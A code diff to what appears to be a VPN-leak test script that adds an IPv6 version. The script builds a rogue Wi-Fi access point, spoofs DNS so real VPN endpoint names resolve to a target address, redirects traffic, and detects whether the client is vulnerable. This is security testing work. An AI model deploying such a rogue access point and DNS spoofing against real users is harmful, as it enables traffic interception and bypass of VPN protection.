@@ -3,21 +3,26 @@
  * We pretend the IP address of the vpn endpoint equals that of our target.
  * Then, we redirect vpn traffic to the real vpn endpoint, rather than the target.
  * We abuse the fact that most vpn clients allow traffic to the vpn endpoint to flow directly.
+ * This is the IPv6 version.
  *)
+
+(* !!!! change the miscnet.set_redirect(...) line below to match your vpn endpoint *)
 
 state init begin:
   miscnet = miscnet();
   prefix_len = "64";
-  my_ip = "2a00:1337:1:1:291:9eff:fe3c:325c";
+  (* not an IPv6 ULA because android will refuse to connect *)
+  my_ip = "2a00:1337:1:1::1";
   (* we want target_ip to flow outside of the tunnel *)
-  target_ip = miscnet.lookup_ipv4("vvts.midnightblue.nl");
+  target_ip = miscnet.lookup_ipv6("v6.phphooligans.nl");
 
   (* perform nat on the interface where our default gateway is at *)
   miscnet.masquerade("true");
   (* blanket redirect all traffic destined for our target to the vpn endpoint *)
-  miscnet.set_redirect("vvts.midnightblue.nl", "www.eduvpn.org");
-  (* make an exception for the traffic we are actually interested in *)
-  miscnet.no_redirect("tcp://vvts.midnightblue.nl:8443");
+  miscnet.set_redirect("v6.phphooligans.nl", "ams.nl.eduvpn.org"); (* wireguard endpoint *)
+  (* miscnet.set_redirect("v6.phphooligans.nl", "eduvpn.uran.ua"); *) (* openvpn endpoint *)
+  (* make an exception for the vvts server component, which shouldn't be redirected to the vpn endpoint *)
+  miscnet.no_redirect("tcp://v6.phphooligans.nl:8443");
 
   ap = accesspoint();
   ap.wifi_interface = "wlan0";
@@ -28,8 +33,8 @@ state init begin:
   ap.slaac_dns = my_ip;
   ap.nat64_enable = "true";
   (* spoof dns and tell the victim that the vpn endpoint is located at the target *)
-  ap.dns_set_override("eduvpn.org", target_ip);
-  ap.dns_set_override("www.eduvpn.org", target_ip);
+  ap.dns_set_override("ams.nl.eduvpn.org", target_ip);
+  ap.dns_set_override("eduvpn.uran.ua", target_ip);
   ap.bring_up(ap_up, ap_err);
 
 state ap_err:
@@ -39,10 +44,10 @@ state ap_up:
   mon = trafficmonitor();
   mon.interface = ap.ap_interface;
   (* make sure validation_server resolves to target_ip *)
-  mon.validation_server = "https://vvts.midnightblue.nl:8443/";
+  mon.validation_server = "https://v6.phphooligans.nl:8443/";
   (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
   (* due to dns spoofing, the client believes the vpn endpoints to be at the target *)
-  mon.vpn_endpoints = "tcp://vvts.midnightblue.nl:443;udp://vvts.midnightblue.nl:443";
+  mon.vpn_endpoints = "tcp://v6.phphooligans.nl:443;udp://v6.phphooligans.nl:443;udp://v6.phphooligans.nl:1194";
   mon.detect_attack(vpn_safe, vpn_vuln, mon_err);
 
 state mon_err:
